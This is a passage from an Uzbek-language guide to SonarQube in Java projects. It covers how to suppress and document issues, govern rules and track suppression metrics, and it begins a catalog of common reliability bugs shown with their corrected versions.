    }
}

// Sonar o'tadigan variant: bostirish emas, dizaynni tuzatish
@Service
public class TolovServiceFixed {
    private final TolovRepository repository; // final, konstruktorda majburiy

    public TolovServiceFixed(TolovRepository repository) {
        this.repository = Objects.requireNonNull(repository);
    }

    public BigDecimal jami(Long buyurtmaId) {
        return repository.summaByBuyurtma(buyurtmaId);
    }
}
```

Bu misol muhim xulosani beradi. Ko'p "false positive" aslida kodning noaniqligi haqidagi signal. Konstruktor inyeksiyasiga o'tish ogohlantirishni ham, test yozishdagi qiyinchilikni ham bir vaqtda yo'q qiladi.

### 24.2 Issue ni "false positive" yoki "won't fix" deb belgilash va farqi

Serverda issue ni yopishning ikki ma'nosi bor va ular aralashtirilmasligi kerak. "False positive" degani: qoida xato ishladi, bu kodda muammo yo'q. "Won't fix" degani (yangi versiyalarda u "Accepted" deb nomlanadi): muammo bor, biz uni ongli ravishda qoldiramiz.

Status modeli versiyaga qarab farq qiladi. 9.9 LTA liniyasida issue "Resolved" holatiga o'tadi va sababi "False Positive" yoki "Won't Fix" bo'ladi. Keyingi liniyalarda, 2025 LTA ni ham qo'shib, "Accepted" alohida status sifatida ko'rinadi. Ikkala holatda ham natija bir xil: issue quality gate ning "new issues" shartiga ta'sir qilmay qoladi.

Farq hisobot uchun emas, qaror uchun muhim. False positive to'planib qolsa, demak profil yoki analiz sozlamasi noto'g'ri va uni tuzatish kerak. Accepted to'planib qolsa, demak jamoa texnik qarzni ongli to'playapti va uni reja bilan kamaytirish kerak. Bir xil belgi ostida ikkisini qo'shib yuborsangiz, hech qaysi muammoni ko'rmaysiz.

| Holat | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Qoida noqulay ko'rinsa | darhol false positive deb belgilanadi | avval qoida tavsifi va misoli o'qiladi, keyin qaror |
| Belgilash huquqi | hammada bor, hech kim kuzatmaydi | "Administer Issues" huquqi cheklangan guruhda |
| Izoh | bo'sh yoki "not relevant" | sabab, muqobil himoya va havola yozilgan |
| Bostirish joyi | tasodifiy: ba'zan UI, ba'zan NOSONAR | qaror daraxti bilan qat'iy belgilangan |
| Bir xil holat ko'p faylda | har safar qaytadan bostiriladi | profilda qoida parametri yoki exclusion bilan yechiladi |
| Klasspath muammosi | issue bostiriladi | `sonar.java.binaries` tuzatiladi, bostirish olib tashlanadi |
| Suppression soni | o'lchanmaydi | metrika sifatida kuzatiladi va chorakda ko'rib chiqiladi |
| Qoidani o'chirish | yashirincha, shaxsiy profilda | yozma asos bilan, umumiy profilda, sababi qayd etilgan |
| Yangi a'zo kelganda | bostirishlar sababini hech kim bilmaydi | har bir bostirishda izoh va muallif bor |
| Qarz holati | gate yashil, lekin kod yomonlashgan | accepted issue soni alohida grafikda ko'rinadi |

### 24.3 Belgilashni asoslash: izoh yozish majburiyati

Izohsiz bostirish eng zararli artefakt, chunki uni keyin hech kim tekshira olmaydi. Oradan bir yil o'tgandan keyin faqat "bu issue yopilgan" degani qoladi, "nega" degani yo'qoladi. Shuning uchun jamoa qoidasi oddiy bo'lishi kerak: izohsiz belgilash code review da rad etiladi.

Yaxshi izohning to'rt elementi bor. Birinchisi, qoida nimani nazarda tutgani va nega bu yerda u ishlamasligi. Ikkinchisi, muammoni boshqa qanday himoya qoplayotgani, masalan test, validatsiya yoki arxitektura cheklovi. Uchinchisi, havola: ticket raqami, ADR yoki pull request. To'rtinchisi, qayta ko'rib chiqish sharti, ya'ni qaysi o'zgarishdan keyin bu bostirish bekor bo'ladi.

```java
// Noto'g'ri izoh: "false positive" (hech narsa tushuntirmaydi)
// To'g'ri izoh namunasi (UI dagi comment maydoniga ham shu matn yoziladi):
//
// FP: qoida bu yerda callerning validatsiyasini ko'rmaydi.
// buyurtmaId OrderController da @Positive bilan tekshiriladi va
// TolovServiceTest#jami_manfiyIdBilan testi shu shartni qo'riqlaydi.
// Havola: PAY-1842. Agar controller validatsiyasi olib tashlansa,
// bu bostirish bekor bo'ladi va qayta ko'rib chiqilishi shart.
@SuppressWarnings("java:S3776") // cognitive complexity: legacy hisobot formulasi
public HisobotQatori qurish(TolovYozuvi yozuv) {
    // PAY-1842 doirasida bo'linadi, hozir formula to'liq ko'rinishda qolishi kerak
    return legacyFormula.apply(yozuv);
}
```

Izohni kod ichida ham, serverda ham bir xil yozish foydali. Serverdagi izoh audit uchun, koddagi izoh keyingi o'quvchi uchun. Ikkisi bir-biriga mos bo'lsa, bostirishni qayta ko'rib chiqish bir daqiqalik ish bo'ladi.

### 24.4 Kod ichida bostirish: `@SuppressWarnings` va uning ta'sir doirasi

Java da Sonar issue ini kod ichida bostirishning asosiy vositasi `@SuppressWarnings` annotatsiyasi va qoida kaliti. Kalit yangi formatda `java:S3776` ko'rinishida yoziladi, eski loyihalarda `squid:S3776` shakli ham uchraydi. Annotatsiyaning retention darajasi SOURCE, demak u bytecode ga tushmaydi va runtime da hech qanday narxi yo'q.

Ta'sir doirasi annotatsiya qo'yilgan element bilan cheklanadi. Klassga qo'yilsa, butun klass ichidagi mos issue lar bostiriladi. Metodga qo'yilsa, faqat shu metod. Lokal o'zgaruvchiga yoki parametrga qo'yilsa, eng tor doira. Qoida oddiy: doira imkon qadar tor bo'lsin, chunki keng doira kelgusida paydo bo'ladigan haqiqiy muammoni ham yashiradi.

```java
// YOMON: butun klassga qo'yilgan, kelgusi haqiqiy muammo ham yashiriladi
@SuppressWarnings({"java:S3776", "java:S1192", "java:S112"})
public class OmborXizmati { /* 600 qator */ }

// YAXSHI: bitta metod, bitta qoida, sabab izohi bilan
public class OmborXizmatiFixed {

    @SuppressWarnings("java:S1192") // SQL fragmentlari ataylab takrorlangan, OMB-77
    public List<Qoldiq> qoldiqHisoboti(Long omborId) {
        return jdbc.query(QOLDIQ_SQL, qoldiqMapper, omborId);
    }

    // Eng tor doira: faqat shu o'zgaruvchi
    public void yuklash(Fayl fayl) {
        @SuppressWarnings("java:S2095") // stream'ni Spring konteyner yopadi
        InputStream oqim = fayl.ochish();
        resurslar.register(oqim);
    }
}
```

`// NOSONAR` izohi ham bor. U qatordagi barcha issue ni bostiradi, kalit talab qilmaydi va shu sababdan ancha qo'pol vosita. Uni faqat annotatsiya qo'yish imkoni bo'lmagan joyda ishlatish kerak, masalan annotatsiya qo'yiladigan element yo'q bo'lsa. Sonar da NOSONAR izohlarini kuzatuvchi qoida bor, uni profilda yoqib qo'yish foydali, shunda bostirishlar o'zi ko'rinadigan bo'ladi.

Uchinchi yo'l skanerlash konfiguratsiyasi. U eng kuchli va eng xavfli, chunki issue serverga umuman kelmaydi va UI da hech qanday iz qoldirmaydi.

```properties
# sonar-project.properties yoki pom.xml ichidagi <properties>
# Generatsiya qilingan koddagi va legacy adapterdagi qoidalarni e'tiborsiz qoldirish
sonar.issue.ignore.multicriteria=e1,e2
sonar.issue.ignore.multicriteria.e1.ruleKey=java:S1192
sonar.issue.ignore.multicriteria.e1.resourceKey=**/generated/**/*.java
sonar.issue.ignore.multicriteria.e2.ruleKey=java:S106
sonar.issue.ignore.multicriteria.e2.resourceKey=**/tools/MigratsiyaCli.java

# Butun fayllarni analizdan chiqarish (eng kuchli, eng ehtiyotkor ishlatiladigan)
sonar.exclusions=**/generated/**,**/*MapperImpl.java
# Coverage hisobidan chiqarish: kod tahlil qilinadi, lekin coverage talab qilinmaydi
sonar.coverage.exclusions=**/config/**,**/*Application.java
# Nusxa-kod (duplication) hisobidan chiqarish
sonar.cpd.exclusions=**/dto/**
```

| Holat | To'g'ri bostirish | Noto'g'ri bostirish |
|---|---|---|
| Spring maydon inyeksiyasi tufayli null ogohlantirish | konstruktor inyeksiyasiga o'tish, bostirish kerak emas | klassga `@SuppressWarnings` qo'yish |
| MapStruct generatsiya qilgan `*MapperImpl` | `sonar.exclusions` bilan generatsiya papkasini chiqarish | har bir generatsiya qilingan faylda NOSONAR |
| CLI vositasida `System.out` ishlatish | shu bitta fayl uchun multicriteria exclusion, sababi yozilgan | butun loyihada konsol chiqishi qoidasini o'chirish |
| Hisobotdagi murakkab formula | metodga `java:S3776`, ticket havolasi bilan, refaktoring rejada | murakkablik qoidasining chegarasini 15 dan 50 ga ko'tarish |
| Resursni konteyner yopadi | lokal o'zgaruvchiga tor bostirish, izoh bilan | `java:S2095` ni profildan olib tashlash |
| Test koddagi assertion uslubi | test uchun alohida profil yoki aniq qoidani o'chirish | `sonar.exclusions` ga testlarni qo'shib yuborish |
| Takrorlangan string literal DTO da | `sonar.cpd.exclusions` yoki konstanta chiqarish | butun paketni analizdan chiqarish |
| Haqiqiy SQL injection ogohlantirishi | parametrlangan query ga o'tish | "won't fix" deb belgilash |
| Klasspath to'liq emasligidan shovqin | `sonar.java.binaries` ni tuzatish | yuzlab issue ni false positive deb yopish |

### 24.5 Bostirishni ko'rib chiqish: ular to'planib qolmasligi uchun tartib

Bostirish bir marta qo'yiladi va abadiy yashaydi, agar hech kim uni qayta ko'rmasa. Shuning uchun tartib kerak. Eng arzon tartib: har bir bostirish pull request da ikkinchi odam tomonidan tasdiqlanadi va izohi tekshiriladi. Bu bitta qoidaning o'zi bostirishlar sonini sezilarli kamaytiradi, chunki ko'pchilik dasturchi izoh yozishdan ko'ra kodni tuzatishni osonroq deb topadi.

Ikkinchi qatlam davriy ko'rib chiqish. Chorakda bir marta koddagi barcha `@SuppressWarnings` va NOSONAR ro'yxati chiqariladi va har biri uchun uch savol beriladi: sabab hali ham amal qiladimi, havolasi ochiqmi, doirasi tor-mi. Javobi yo'q bo'lganlari olib tashlanadi.

```bash
# Koddagi barcha bostirishlarni ro'yxatga olish va eng ko'p uchraydiganlarini sanash
grep -rn --include='*.java' -E '@SuppressWarnings|NOSONAR' src/ > /tmp/suppressions.txt
wc -l /tmp/suppressions.txt

# Qaysi qoida eng ko'p bostirilgan: shu qoida haqida jamoada suhbat kerak
grep -rhoE 'java:S[0-9]+' src/ | sort | uniq -c | sort -rn | head -10

# Izohsiz bostirishlar: ular birinchi navbatda tuzatiladi
grep -rn --include='*.java' -E '@SuppressWarnings\("[^"]+"\)\s*$' src/

# Skanerlash konfiguratsiyasidagi yashirin exclusion larni ko'rish
grep -rnE 'sonar\.(exclusions|issue\.ignore|coverage\.exclusions)' pom.xml *.properties
```

Uchinchi qatlam serverdagi hisobot. False positive va accepted issue lar ro'yxatini filtr bilan chiqarib, muallif va sana bo'yicha ko'rib chiqish mumkin. Eng muhim signal: bitta qoida bo'yicha ko'p false positive. Bu qoidani butunlay o'chirish yoki parametrini o'zgartirish vaqti kelganini bildiradi.

### 24.6 Qoidani butunlay o'chirish qachon to'g'ri qaror

Qoidani o'chirish ko'pincha eng halol yechim. Agar jamoa bir qoidani yuz marta bostirgan bo'lsa, demak jamoa u qoidaga qo'shilmaydi. Yuz joyda yashirin bostirish saqlashdan ko'ra, profilda bir marta o'chirib, sababini yozib qo'yish aniqroq va tekshirilishi oson.

O'chirish uchun uchta mezon. Birinchisi, qoida bo'yicha bostirishlar soni haqiqiy tuzatishlar sonidan ko'p. Ikkinchisi, qoida loyihaning ongli uslub qaroriga qarshi turadi, masalan jamoa ataylab boshqa naming konvensiyasini ishlatadi. Uchinchisi, qoida bir xil holatda muntazam xato ishlaydi va buni konfiguratsiya tuzatmaydi.

O'chirmaslik kerak bo'lgan holat ham aniq. Agar qoida security kategoriyasida bo'lsa va bostirishlar bitta dasturchidan kelayotgan bo'lsa, bu qoida muammosi emas, bilim muammosi. Bunday paytda qoida qoladi, o'qitish qo'shiladi.

Amalda o'chirish quality profile ichida qilinadi va u versiyalanadigan artefakt bo'lishi kerak. Profilni eksport qilib repozitoriyda saqlash qaror tarixini ko'rsatadi.

```xml
<!-- Eksport qilingan quality profile fragmenti: qaror tarixi repozitoriyda qoladi -->
<!-- config/sonar/profile-backend.xml -->
<profile>
  <name>Backend Java</name>
  <language>java</language>
  <rules>
    <!-- Cognitive complexity: chegara ko'tarilgan, o'chirilmagan.
         Sabab: hisobot modulidagi formulalar, ADR-014. -->
    <rule>
      <repositoryKey>java</repositoryKey>
      <key>S3776</key>
      <priority>MAJOR</priority>
      <parameters>
        <parameter>
          <key>threshold</key>
          <value>20</value>
        </parameter>
      </parameters>
    </rule>
    <!-- Ishlatilmagan metod parametri: o'chirilgan.
         Sabab: event handler imzolari framework tomonidan belgilanadi, ADR-019. -->
  </rules>
</profile>
```

Parametrni o'zgartirish ko'pincha o'chirishdan yaxshiroq. Qoida yashab qoladi, lekin chegarasi jamoa haqiqatiga mos bo'ladi. Chegarani 15 dan 20 ga ko'tarish mumkin, 50 ga ko'tarish esa qoidani o'chirishning yashirin shakli.

### 24.7 O'z qoidangizni yozish: qachon zarur bo'ladi

O'z qoidangiz kerak bo'ladigan holat bitta: loyihada takrorlanadigan va avtomatik tekshirilishi mumkin bo'lgan o'z konvensiyangiz bor, va uni code review da aytishdan charchagansiz. Masalan "to'lov summasi hech qachon `double` bo'lmaydi", yoki "tashqi API chaqiruvi albatta timeout bilan bo'ladi", yoki "domen klassida Spring annotatsiyasi bo'lmaydi".

Oddiy holatlarda qoida yozish kerak emas. Sonar da shablon qoidalar bor: ulardan nusxa olib, o'z regex yoki parametringizni berasiz va natijada o'z qoidangiz paydo bo'ladi. Masalan izohlar yoki nomlar ustidan regex bilan ishlaydigan shablonlar shu tarzda ishlatiladi. Bu yo'l bir soatlik ish, o'z plaginini yozish esa bir hafta va doimiy qo'llab-quvvatlash.

Chindan ham AST darajasida tekshiruv kerak bo'lsa, Java uchun custom plugin yoziladi. Unda `IssuableSubscriptionVisitor` dan meros olinadi va qaysi tugunlarni kuzatish aytiladi.

```java
// Custom Sonar Java qoidasi skeleti.
// API nomlari sonar-java versiyasiga qarab farq qiladi, misol repozitoriyasini tekshiring.
@Rule(key = "TolovSummasiDouble")
public class TolovSummasiDoubleRule extends IssuableSubscriptionVisitor {

    @Override
    public List<Tree.Kind> nodesToVisit() {
        return List.of(Tree.Kind.VARIABLE); // maydon va lokal o'zgaruvchilar
    }

    @Override
    public void visitNode(Tree tree) {
        VariableTree variable = (VariableTree) tree;
        String tip = variable.type().symbolType().fullyQualifiedName();
        String nom = variable.simpleName().name().toLowerCase(Locale.ROOT);

        boolean pulgaOxshash = nom.contains("summa") || nom.contains("narx");
        boolean suzuvchiTip = "double".equals(tip) || "float".equals(tip);

        if (pulgaOxshash && suzuvchiTip) {
            reportIssue(variable.simpleName(),
                "Pul miqdori uchun BigDecimal ishlatilsin, double aniqlikni yo'qotadi.");
        }
    }
}
```

Plaginni yozishdan oldin uchta narxni hisoblang. Birinchisi, plagin SonarQube versiyasiga bog'lanadi va har yangilanishda tekshirilishi kerak. Ikkinchisi, plaginni serverga admin o'rnatadi, demak deployment jarayoni paydo bo'ladi. Uchinchisi, qoidaga test yozish kerak, aks holda u o'zi false positive manbasiga aylanadi.

### 24.8 Qoida yozishning muqobillari: ArchUnit, linter, code review qoidasi

Ko'p holatda Sonar plagini eng qimmat yechim va eng arzon muqobil bor. Arxitektura cheklovlari uchun ArchUnit to'g'ri vosita: u oddiy test, repozitoriyda yashaydi, pull request da ishlaydi va buzilganda darhol qizil bo'ladi. Serverga hech narsa o'rnatilmaydi. ArchUnit ning batafsil mavzusi testlash qo'llanmasidagi ArchUnit bo'limida.

Formatlash va import tartibi uchun Spotless yoki Checkstyle arzonroq, chunki ular kodni o'zi tuzatadi. Bog'liqlik versiyalari uchun Maven Enforcer. Kutubxona ichidagi taqiqlangan API lar uchun ko'pincha oddiy arch test yetarli.

| Tuzoq | Yechim |
|---|---|
| Har bir konvensiya uchun Sonar plagini yozish | avval shablon qoida, keyin ArchUnit, plagin oxirgi chora |
| Plagin yozilgan, lekin unga test yozilmagan | qoidaga musbat va manfiy misollar bilan test majburiy |
| Plagin SonarQube yangilanishida sinadi | plagin versiyasi va server versiyasi CI da birga tekshiriladi |
| ArchUnit testi bor, lekin pipeline da ishlamaydi | arch testlar asosiy test fazasiga kiritiladi, alohida profilga yashirilmaydi |
| Bir xil tekshiruv Sonar da ham, linterda ham | bitta egasi tanlanadi, ikkinchisi o'chiriladi |
| Konvensiya faqat README da yozilgan | avtomatlashtirilmagan konvensiya buziladi, uni testga aylantirish kerak |
| Qoida juda keng yozilgan, shovqin beradi | qoida tor shartdan boshlanadi, keyin asta kengaytiriladi |
| Legacy kod yangi qoidani darhol buzadi | qoida faqat yangi kodga qo'llanadi yoki legacy paket vaqtincha chiqariladi |

### 24.9 Jamoaviy kelishuv: kim belgilaydi, kim tasdiqlaydi

Bostirish texnik emas, boshqaruv masalasi. Agar hamma hamma narsani bostira olsa, quality gate ma'nosini yo'qotadi. Shuning uchun huquqlarni ajratish kerak. SonarQube da issue ni false positive yoki accepted deb belgilash uchun maxsus huquq bor, u standart holatda keng tarqalgan, va uni cheklash birinchi qadam.

Ishlaydigan model quyidagicha. Dasturchi bostirishni taklif qiladi, ya'ni kodda annotatsiya va izoh bilan pull request ochadi. Reviewer izohni tekshiradi. Qoidani o'chirish yoki profil parametrini o'zgartirish esa boshqa darajada hal qilinadi: buni texnik yetakchi yoki arxitektor qiladi va qarorni ADR shaklida yozadi.

Muhim nuans: serverdagi UI orqali belgilash kod tarixida iz qoldirmaydi. Shu sababdan ko'p jamoa shunday kelishadi: doimiy bostirish koddagi annotatsiya bilan qilinadi, UI orqali belgilash esa faqat vaqtincha va faqat "Administer Issues" huquqi bor odamlar tomonidan. Shunda har bir bostirish git tarixida muallifi va sababi bilan qoladi.

```xml
<!-- pom.xml: skaner konfiguratsiyasi repozitoriyda, ya'ni review ostida -->
<properties>
  <sonar.projectKey>ombor-backend</sonar.projectKey>
  <!-- Versiyani qotirib qo'yish: skaner yangilanishi kutilmagan natija bermasligi uchun -->
  <sonar.maven.plugin.version><!-- joriy versiyani tekshirib yozing --></sonar.maven.plugin.version>
  <!-- Analiz uchun kompilyatsiya natijasi: to'liq bo'lmasa false positive ko'payadi -->
  <sonar.java.binaries>${project.build.outputDirectory}</sonar.java.binaries>
  <sonar.coverage.jacoco.xmlReportPaths>
    ${project.build.directory}/site/jacoco/jacoco.xml
  </sonar.coverage.jacoco.xmlReportPaths>
</properties>
```

### 24.10 Suppression statistikasini kuzatish va ularni kamaytirish

O'lchanmagan narsa boshqarilmaydi. Bostirishlar uchun uchta oddiy metrika yetarli. Birinchisi, koddagi `@SuppressWarnings` va NOSONAR larning umumiy soni. Ikkinchisi, serverdagi false positive va accepted issue lar soni. Uchinchisi, bir qoida bo'yicha bostirishlarning eng yuqori ulushi.

Bu uch raqamni har sprintda yozib borish kerak. O'sish tendensiyasi ikki xil ma'no beradi. Agar accepted o'sayotgan bo'lsa, texnik qarz to'planayapti. Agar false positive o'sayotgan bo'lsa, sozlama yoki profil muammosi bor va uni tuzatish bitta ishda yuzlab issue ni yopadi.

```sql
-- Bostirishlar sonini o'z metrika jadvalingizda kuzatish misoli.
-- Raqamlar CI dagi grep natijasidan va server hisobotidan yoziladi.
CREATE TABLE sifat_metrikasi (
    sana            DATE         NOT NULL,
    modul           VARCHAR(64)  NOT NULL,
    suppress_kod    INTEGER      NOT NULL, -- @SuppressWarnings va NOSONAR soni
    false_positive  INTEGER      NOT NULL, -- serverda FP deb belgilangan
    accepted        INTEGER      NOT NULL, -- ongli qoldirilgan issue lar
    PRIMARY KEY (sana, modul)
);

-- Oxirgi olti o'lchovda bostirishlar o'sganmi: tendensiyani ko'rish
SELECT modul,
       MIN(suppress_kod) AS eng_kam,
       MAX(suppress_kod) AS eng_ko_p,
       MAX(suppress_kod) - MIN(suppress_kod) AS o_sish
FROM sifat_metrikasi
WHERE sana > CURRENT_DATE - INTERVAL '6 months'
GROUP BY modul
ORDER BY o_sish DESC;
```

Kamaytirishning eng samarali usuli guruhlab ishlash. Eng ko'p bostirilgan bitta qoidani olasiz va uning hamma holatini bir sprintda hal qilasiz: qismi tuzatiladi, qismi uchun qoida parametri o'zgartiriladi, qolgani uchun qoida o'chiriladi. Bitta-bitta tuzatish bu ishni hech qachon tugatmaydi.

### 24.11 Sonar charchog'i: belgilar ko'payib ketganda nima qilish

Sonar charchog'i shunday ko'rinadi: dasturchi hisobotni ochmaydi, chunki unda yuzlab issue bor va ularning qaysi biri muhimligi tushunarsiz. Natija: gate ni o'tkazish uchun mexanik bostirish boshlanadi va vosita o'z ma'nosini yo'qotadi.

Davosi texnik emas, fokusni toraytirishda. Birinchi qadam: faqat yangi kodga qarash. Clean as You Code yondashuvi aynan shu uchun ishlab chiqilgan, legacy dagi minglab issue gate ni bloklamaydi. Ikkinchi qadam: profilni qisqartirish. Haqiqiy bug va security qoidalarini qoldirib, uslub qoidalarining bir qismini formatlovchi vositaga topshirish shovqinni keskin kamaytiradi.

Uchinchi qadam: bitta mavzuga fokus. Bu chorak faqat resurs yopilishi, keyingisi faqat null xavfsizligi. To'rtinchi qadam: kirish nuqtasi IDE bo'lishi. SonarLint yoki IDE plagini ogohlantirishni yozish paytida ko'rsatsa, issue CI ga yetib bormaydi va charchoq ham paydo bo'lmaydi.

Oxirgi va eng muhim qadam: bostirishni oson, tuzatishni qiyin qilib qo'ymaslik. Agar bostirish bir klik, tuzatish esa yarim kun bo'lsa, jamoa doim bostirishni tanlaydi. Izoh majburiyati va reviewer tasdig'i aynan shu balansni teskari tomonga buradi.

### 24.12 Amalda qo'llash

- [ ] `sonar.java.binaries` va kutubxona yo'llarini tekshirib, klasspathdan kelayotgan false positive larni bitta ishda yo'q qiling.
- [ ] Koddagi barcha `@SuppressWarnings` va NOSONAR ni `grep` bilan ro'yxatga oling, izohsiz bo'lganlariga sabab yozing yoki olib tashlang.
- [ ] Jamoada yozma qoida qabul qiling: false positive va accepted farqi, izohning to'rt elementi, va kim tasdiqlashi.
- [ ] "Administer Issues" huquqini cheklangan guruhga bering, doimiy bostirishlarni koddagi annotatsiyaga ko'chiring.
- [ ] Eng ko'p bostirilgan uchta qoidani aniqlang va har biri uchun qaror qabul qiling: tuzatish, parametrni o'zgartirish yoki o'chirish.
- [ ] Quality profile ni eksport qilib repozitoriyda saqlang, har bir o'chirilgan qoida yoniga sabab va ADR havolasini yozing.
- [ ] Yangi konvensiyani Sonar plagini bilan emas, avval shablon qoida yoki ArchUnit testi bilan avtomatlashtirishga harakat qiling.
- [ ] Har sprintda suppress, false positive va accepted sonlarini yozib boring va chorakda tendensiyani ko'rib chiqing.


# VII. Xato katalogi: qanday kod qanday xato hisoblanadi

## 25. Xato katalogi: reliability (bug) toifasi (Catalog: Reliability)

Reliability toifasi Sonar uchun eng qattiq toifa, chunki bu yerdagi issue "kod ishlamaydi yoki kutilmagan holatda sinadi" degan ma'noni bildiradi. Quality gate ko'pincha aynan yangi bug soniga nol chek qo'yadi, shuning uchun bu katalogdagi holatlar birinchi navbatda tuzatiladi. Quyida har bir holat uchun shikoyat qilinadigan kod, shikoyat sababi va tuzatilgan variant berilgan. Misollar to'lov servisi, buyurtma va ombor qoldig'i ustida.

| Kod holati | Sonar nima deydi | Toifa | Jiddiylik (taxminan) | Ta'siri |
|---|---|---|---|---|
| `null` qaytishi mumkin metod natijasini tekshirmasdan ishlatish | null dereference xavfi (`java:S2259`) | reliability (bug) | Major yoki Blocker | So'rov `NullPointerException` bilan tushadi |
| `Optional.get()` ni `isPresent()` dan oldin chaqirish | Optional qiymati tekshirilmagan (`java:S3655`) | reliability (bug) | Major | `NoSuchElementException` |
| `InputStream`, `Connection`, `Statement` yopilmaydi | resurs yopilishi shart (`java:S2095`) | reliability (bug) | Blocker yoki Major | Connection pool tugaydi, servis muzlaydi |
| `equals` bor, `hashCode` yo'q | ikkisi birga qayta yozilishi kerak (`java:S1206`) | reliability (bug) | Blocker | `HashMap` va `HashSet` da yozuv yo'qoladi |
| `Long` yoki `Integer` ni `==` bilan solishtirish | obyekt havolasi solishtirilmoqda | reliability (bug) | Major | 127 dan katta ID lar teng emas deb chiqadi |
| `double` ni `==` bilan solishtirish | suzuvchi nuqta tengligi (`java:S1244`) | reliability (bug) | Major | Pul summasi hech qachon teng kelmaydi |
| Pul uchun `double` maydon | aniqlik yo'qolishi, `BigDecimal` kerak | reliability (bug) yoki code smell | Major | Hisob-kitobda tiyin yo'qoladi |
| `String.trim()` natijasi ishlatilmaydi | metod natijasi e'tiborsiz (`java:S2201`) | reliability (bug) | Major | Tozalash amalda bajarilmaydi |
| `catch (InterruptedException e) {}` | interrupt holati yutilgan (`java:S2142`) | reliability (bug) | Major | Thread to'xtatilmaydi, graceful shutdown buziladi |
| Shart har doim `true` yoki `false` | shart o'zgarmas (`java:S2583`) | reliability (bug) | Major | Tekshiruv amalda ishlamaydi |
| `if` dan keyin yetib bo'lmaydigan kod | unreachable code (`java:S1763`) | reliability (bug) | Major | Mantiq hech qachon bajarilmaydi |
| `for-each` ichida `list.remove(...)` | to'plam iteratsiya paytida o'zgartirilgan | reliability (bug) | Major | `ConcurrentModificationException` |
| `Collectors.toMap` da takroriy kalit | merge funksiyasi berilmagan | reliability (bug) | Major | `IllegalStateException`, hisobot tushadi |
| `static SimpleDateFormat` ni baham ko'rish | thread-safe bo'lmagan maydon static | reliability (bug) | Blocker yoki Major | Yuk ostida sana buzilib chiqadi |
| `compareTo` bor, `equals` moslanmagan | ikkisi mos kelishi kerak (`java:S1210`) | reliability (bug) | Major | `TreeSet` va `List.contains` turlicha javob beradi |
| Sikl o'zgaruvchisi tanada o'zgartirilgan (`java:S127`) | counter tanada o'zgartirilmasin | reliability (bug) | Major | Qatorlar o'tkazib yuboriladi |
| Sikl shartiga ta'sir qilmaydigan tana (`java:S2189`) | cheksiz sikl | reliability (bug) | Blocker | CPU 100 foiz, pod restart |

### 25.1 Toifa va jiddiylik qanday o'qiladi

Toifa qoidaga biriktirilgan va o'zgarmaydi, jiddiylik esa faol quality profile da sozlanadi. Shuning uchun jadvaldagi jiddiylik "taxminan": bir loyihada Major, boshqasida Blocker bo'lishi mumkin. 2025 LTA liniyasidagi yangi "software quality" modelida bitta issue bir vaqtda reliability va maintainability ta'siriga ega bo'lib ko'rinishi mumkin, eski 9.9 LTA da esa faqat bitta toifa ko'rsatiladi.

### 25.2 null bo'lishi mumkin bo'lgan qiymatga murojaat qilish

```java
// SHIKOYAT: findByOrderId null qaytarishi mumkin
public BigDecimal paidAmount(String orderId) {
    Payment payment = paymentRepository.findByOrderId(orderId);
    return payment.getAmount(); // null dereference
}
```

Sonar metodning qaytish yo'llarini kuzatadi va `null` qaytarish imkoni bor yo'lni topadi. Agar shu qiymat tekshirilmasdan ishlatilsa, u null dereference deb belgilanadi. `@Nullable` annotatsiyasi yoki `Optional` qaytish turi tahlilni yanada aniq qiladi.

```java
// TUZATILGAN: yo'qlik holati aniq ifodalangan
public BigDecimal paidAmount(String orderId) {
    return paymentRepository.findByOrderId(orderId)
            .map(Payment::getAmount)
            .orElse(BigDecimal.ZERO);
}
```

Repository metodlari `Optional` qaytarsin, shunda yo'qlik holati kompilyatsiya darajasida ko'rinadi.

### 25.3 Optional ni tekshirmasdan get() chaqirish

```java
// SHIKOYAT: get() himoyalanmagan
Optional<Order> found = orderRepository.findById(id);
Order order = found.get(); // NoSuchElementException xavfi
```

Sonar `Optional` ustida `isPresent()` yoki `isEmpty()` tekshiruvi bo'lmasa `get()` ni bug deb belgilaydi. Bu qoida `orElseThrow()` ga ham tegishli emas, chunki unda xato turi aniq.

```java
// TUZATILGAN: yo'qlik holati domen istisnosiga aylantirilgan
Order order = orderRepository.findById(id)
        .orElseThrow(() -> new OrderNotFoundException(id));
```

`get()` ni loyiha bo'ylab taqiqlang va `orElseThrow` ni standart qiling.

### 25.4 Yopilmagan resurs: InputStream, Connection, Statement

```java
// SHIKOYAT: istisno bo'lsa resurs ochiq qoladi
public int stockOf(String sku) throws SQLException {
    Connection c = dataSource.getConnection();
    PreparedStatement ps = c.prepareStatement(STOCK_SQL);
    ps.setString(1, sku);
    ResultSet rs = ps.executeQuery();
    return rs.next() ? rs.getInt(1) : 0;
}
```

Sonar `AutoCloseable` ni amalga oshiruvchi obyekt yaratilib, barcha chiqish yo'llarida yopilmaganini ko'radi. Connection pool da bu eng og'ir xato: ochiq connection qaytarilmaydi va bir necha daqiqada servis butunlay to'xtaydi.

```java
// TUZATILGAN: try-with-resources barcha yo'llarda yopadi
public int stockOf(String sku) throws SQLException {
    try (Connection c = dataSource.getConnection();
         PreparedStatement ps = c.prepareStatement(STOCK_SQL)) {
        ps.setString(1, sku);
        try (ResultSet rs = ps.executeQuery()) {
            return rs.next() ? rs.getInt(1) : 0;
        }
    }
}
```

Shu so'rovni sinash uchun ombor jadvali ustidagi SQL ni alohida ushlab turing.

```sql
-- ombor qoldig'i: sku bo'yicha bitta qator
SELECT quantity
FROM warehouse_stock
WHERE sku = ?
  AND warehouse_id = current_setting('app.warehouse')::bigint;
```

Har qanday `AutoCloseable` ni faqat try-with-resources ichida yarating.

### 25.5 equals va hashCode ni birgalikda yozmaslik

```java
// SHIKOYAT: hashCode yo'q
public class Sku {
    private final String code;
    @Override public boolean equals(Object o) {
        return o instanceof Sku s && code.equals(s.code);
    }
}
```

Sonar bu juftlikni qattiq nazorat qiladi, chunki kontrakt buzilganda `HashSet` ikkita teng obyektni ikki xil deb qabul qiladi. Ombor qoldig'ini `Map<Sku, Integer>` da yig'sangiz, bitta SKU bir necha marta sanaladi.

```java
// TUZATILGAN: ikkisi birga
@Override public boolean equals(Object o) {
    return o instanceof Sku s && code.equals(s.code);
}
@Override public int hashCode() {
    return Objects.hash(code);
}
```

Qiymat obyektlari uchun `record` ishlatsangiz, bu juftlik avtomatik to'g'ri bo'ladi.

### 25.6 Boxed turlarni == bilan solishtirish

```java
// SHIKOYAT: havola solishtirilmoqda
Long paymentId = payment.getId();
Long expectedId = request.getPaymentId();
if (paymentId == expectedId) {   // 127 dan katta qiymatlarda false
    confirm(payment);
}
```

